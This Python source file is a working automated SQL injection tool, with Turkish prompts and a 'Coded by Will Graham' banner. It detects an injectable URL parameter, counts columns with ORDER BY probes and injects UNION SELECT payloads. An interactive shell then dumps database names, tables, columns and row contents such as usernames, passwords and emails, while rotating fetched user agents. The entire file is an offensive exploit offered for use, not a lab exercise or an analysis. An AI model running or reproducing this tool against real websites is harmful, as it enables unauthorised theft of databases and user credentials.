from urllib.parse import urlparse, parse_qs
from rich.console import Console
from requests import get
from random import choice
from sys import exit
import re, binascii

class SqlInjection:
    def __init__(self):
        self.payload = ""
        self.param = ""
        self.char = ""
        self.payloads = [
            ["+UNION+SELECT+", "CONCAT([QUERY])", "':::WillGraham:::',(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),':::-WillGraham:::'", "':::WillGraham:::',(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=[DATABASE]),':::-WillGraham:::'", "':::WillGraham:::',(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=[WIITABLE]),':::-WillGraham:::'", "':::WillGraham:::',(SELECT+GROUP_CONCAT([WIICOLUMNS]+SEPARATOR+0x3c62723e)+FROM+[WIDB].[WITABLE]),':::-WillGraham:::'"]
        ]
        self.console = Console()
        try:
            user_agents_url = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
            response = get(user_agents_url)
            self.agents = response.text.splitlines()
        except:
            self.console.print(f"\n[#FF0000]Hata: İnternete bağlı olduğunuzdan emin olunuz.\n", end="")
            exit(1)

    def banner(self):
        banner_text = """[#FFFF00]
                                                                    Coded by Will Graham[#FF0033]
  .dBBBBP   dBBBBP     dBP    dBP dBBBBb     dBP dBBBP  dBBBP  dBBBBBBP dBP dBBBBP dBBBBb
  BP       dB'.BP                    dBP                                   dB'.BP     dBP
  `BBBBb  dB'.BP     dBP    dBP dBP dBP    dBP dBBP   dBP       dBP   dBP dB'.BP dBP dBP 
     dBP dB'.BB  dB'dBP    dBP dBP dBP dB'dBP dBP    dBP       dBP   dBP dB'.BP dBP dBP  
dBBBBP' dBBBB'B dBBBBP    dBP dBP dBP dBBBBP dBBBBP dBBBBP    dBP   dBP dBBBBP dBP dBP v1.0

        """

        self.console.print(banner_text)

    def get_data(self, URL):
        self.console.print("\n[#00FF33][underline]Veritabanı Adı[/underline] > ", end="")
        db = input()

        self.console.print("\n[#00FF33][underline]Tablo Adı[/underline] > ", end="")
        table = input()

        self.console.print("\n[#00FF33][underline]Kolon Adları (örn: user,pass,email)[/underline] > ", end="")
        columns = input()

        payload = self.payload[5].replace(
            "[WIICOLUMNS]", columns.replace(",", ",':::',") + ",'<br>'"
        )

        payload = payload.replace(
            "[WIDB]", db            
        )

        payload = payload.replace(
            "[WITABLE]", table            
        )

        self.console.print("")
        response = get(
            URL.replace(
                "[QUERY]",
                payload
            ),
            headers={
                "User-Agent": choice(self.agents)
            }
        )

        data = self.regex(response.text, "<br>")

        for dm in data:
            self.console.print("[#00FF33]-------------------------------------------------------")
            for item in dm.split(":::"):
                if item.strip() == "":
                    continue
                self.console.print(f"[#00FF33][+][#F8F4FF] {columns.split(',')[dm.split(':::').index(item)]}: {item}")
        self.console.print("")

    def get_columns(self, URL):
        self.console.print("\n[#00FF33][underline]Tablo Adı[/underline] > ", end="")
        table = binascii.hexlify(input().encode("utf-8"))
        self.console.print("")
        response = get(
            URL.replace(
                "[QUERY]",
                self.payload[4].replace(
                    "[WIITABLE]",
                    f"0x" + str(table.decode("utf-8"))
                )
            ),
            headers={
                "User-Agent": choice(self.agents)
            }
        )

        data = self.regex(response.text, "<br>")

        for table in data:
            self.console.print(f"[#00FF33][+][#F8F4FF] {table}")
        self.console.print("")

    def get_tables(self, URL):
        self.console.print("\n[#00FF33][underline]Veritabanı adı[/underline] > ", end="")
        db = binascii.hexlify(input().encode("utf-8"))
        self.console.print("")
        response = get(
            URL.replace(
                "[QUERY]",
                self.payload[3].replace(
                    "[DATABASE]",
                    f"0x" + str(db.decode("utf-8"))
                )
            ),
            headers={
                "User-Agent": choice(self.agents)
            }
        )

        data = self.regex(response.text, "<br>")

        for table in data:
            self.console.print(f"[#00FF33][+][#F8F4FF] {table}")
        self.console.print("")

    def get_dbs(self, URL):
        response = get(
            URL.replace(
                "[QUERY]",
                self.payload[2]
            ),
            headers={
                "User-Agent": choice(self.agents)
            }
        )

        data = self.regex(response.text, "<br>")

        self.console.print("")
        for db in data:
            self.console.print(f"[#00FF33][+][#F8F4FF] {db}")
        self.console.print("")

    def regex(self, source, repl):
        data = list(set(re.findall(':::WillGraham:::(.*?):::-WillGraham:::', source)))
        return data[0].split(repl)

    def print_help(self):
        help_text = """
    [#F8F4FF]Komutlar
    [#F8F4FF]   • [#FF0033]get_dbs[#0b3861]: Tüm veritabanlarını çeker.
    [#F8F4FF]   • [#FF0033]get_tables[#0b3861]: Seçilen veritabanına ait tüm tabloları çeker.
    [#F8F4FF]   • [#FF0033]get_columns[#0b3861]: Seçilen tablo'nun içindeki kolonları çeker.
    [#F8F4FF]   • [#FF0033]get_data[#0b3861]: Kolonların içindeki verileri çeker.
        """
        
        self.console.print(help_text)

    def getNumber(self):
        source = get(self.url + self.char + "+order+by+101+--+-", headers={"User-Agent": choice(self.agents)})

        for i in range(1, 100):
            try:
                response = get(self.url.replace(self.param, self.param + self.char + "+order+by+" + str(i) + "+--+-"), headers={"User-Agent": choice(self.agents)})
                self.console.print(f"[#FFFF00][*][#F8F4FF] {self.url + self.char + '+order+by+' + str(i) + '+--+-'}")
                for n in range(3):
                    if len(response.text) == len(source.text) or len(response.text) + n == len(source.text) or len(response.text) - n == len(source.text):
                        return i-1
            except:
                continue
        return 0

    def start(self):
        self.banner()

        try:
            self.console.print("[#00FF33][underline]Sql açığının bulunduğu link'i girin[/underline] > ", end="")
            self.url = input()

            response = get(self.url, headers={"User-Agent": choice(self.agents)})
            if response.status_code == 404:
                self.console.print(f"\n[#FF0000]Hata: Girdiğiniz link'e ait bir sayfa bulunamadı. Lütfen doğru bir link girdiğinizden emin olunuz.")
                exit(1)
            elif "?" not in self.url:
                self.console.print(f"\n[#FF0000]Hata: url'yi sql açığı'nın bulunduğu parametre ile birlikte girin.")
                exit(1)

        except KeyboardInterrupt:
            self.console.print(f"\n[#FF0000]Hata: CTRL + C kombinasyonu ile programdan çıkış yapıldı.")
            exit(1)
        except:
            self.console.print(f"\n[#FF0000]Hata: Girdiğiniz link'e ulaşılamıyor!\n", end="")
            exit(1)

        print("")
        for char in ["", "'"]:
            query_params = parse_qs(urlparse(self.url).query)
            for param, value in query_params.items():
                r1 = get(
                    self.url.replace(
                        str(param) + "=" + str(value[0]),
                        str(param) + "=" + str(value[0]) + char + "+order+by+999+--+-"),
                    headers={
                        "User-Agent": choice(self.agents)
                })
                
                r2 = get(
                    self.url.replace(
                        str(param) + "=" + str(value[0]),
                        str(param) + "=" + str(value[0]) + char + "+order+by+1+--+-"),
                    headers={
                        "User-Agent": choice(self.agents)
                })

                if len(r1.text) != len(r2.text):
                    self.char = char
                    self.param = str(param) + "=" + str(value[0])
            
        cn = self.getNumber()
        if cn == 0:
            self.console.print(f"\n[#FF0000]Hata: Kolon sayısı bulunamadı!")
            exit(1)

        self.console.print(f"\n[#00FF33][+][#F8F4FF] Kolon sayısı bulundu: [#FF0033]{str(cn)}\n")

        item = ""
        for i in range(1, cn + 1):
            item +=str(i)+","
        item = item[:-1] + "+--+-"

        for payload in self.payloads:
            for i in range(0, cn):
                lst = item.split(",")
                lst[i] = payload[1].replace("[QUERY]", "'<WillGraham'+'WillGraham>'")

                newitem = ','.join(lst)
                response = get(
                    self.url.replace(
                        self.param,
                        self.param.replace("=","=-") + self.char + payload[0] + newitem
                    ),
                    headers={"User-Agent": choice(self.agents)
                })
                self.console.print(
                    f"[#FFFF00][*] [#F8F4FF]{self.url.replace(self.param, self.param.replace('=', '=-') + self.char + payload[0] + newitem)}"
                )

                if "<WillGrahamWillGraham>" in response.text:
                    self.payload = payload
                    newitem = newitem.replace("'<WillGraham'+'WillGraham>'", "[QUERY]")
                    URL = self.url.replace(self.param, self.param.replace('=', '=-') + self.char + payload[0] + newitem)

                    response = get(
                        URL.replace(
                            "[QUERY]",
                            "':::WillGraham:::',user(),',',database(),',',@@version,':::-WillGraham:::'"),
                        headers={
                            "User-Agent": choice(self.agents)
                        }
                    )

                    data = self.regex(response.text, ",")
                    database = str(data[1])
                    self.console.print(f"\n[#00FF33][+][#F8F4FF] Veritabanı: {str(data[1])}")
                    self.console.print(f"[#00FF33][+][#F8F4FF] Kullanıcı: {str(data[0])}")
                    self.console.print(f"[#00FF33][+][#F8F4FF] Versiyon: {str(data[2])}\n")

                    while True:    
                        try:
                            self.console.print("[#FF0033][underline]SQLI[/underline] > ", end="")
                            COMMAND = input()
                        except KeyboardInterrupt:
                            self.console.print(f"\n[#FF0000]Hata: CTRL + C kombinasyonu ile programdan çıkış yapıldı.")
                            exit(1)
                        except:
                            continue

                        if COMMAND.lower() == "help":
                            self.print_help()
                    
                        elif COMMAND.lower() == "exit":
                            exit(1)

                        elif COMMAND.lower() == "get_dbs":
                            self.get_dbs(URL)

                        elif COMMAND.lower() == "get_tables":
                            self.get_tables(URL)

                        elif COMMAND.lower() == "get_columns":
                            self.get_columns(URL)

                        elif COMMAND.lower() == "get_data":
                            self.get_data(URL)

        self.console.print(f"\n[#FF0000]Hata: Sql injection açığı sömürülemedi.")

if __name__ == "__main__":
    injection = SqlInjection()
    injection.start()
